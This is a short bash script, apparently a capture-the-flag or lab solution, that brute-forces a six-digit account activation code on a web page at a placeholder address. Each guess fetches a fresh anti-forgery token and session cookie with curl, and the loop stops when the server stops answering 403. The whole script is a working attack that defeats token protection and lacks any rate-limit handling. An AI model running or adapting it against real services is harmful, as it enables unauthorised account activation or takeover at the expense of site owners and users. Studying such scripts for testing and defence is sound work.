#!/bin/bash
url="http://ip/activate.php"
for key in {000000..999999}; do
	token=$(curl -s -c cookie $url | awk -F 'value=' '/token/ {print $2}' | cut -d "'" -f2)
	resp=$(curl -s -w %{http_code} -b cookie --data "userid=14&activation_code=$key&token=${token}" $url | tail -n 1 | cut -d ">" -f2)
	if [ $resp -ne 403 ]; then
		echo "Key = "$key
		break
	fi
done
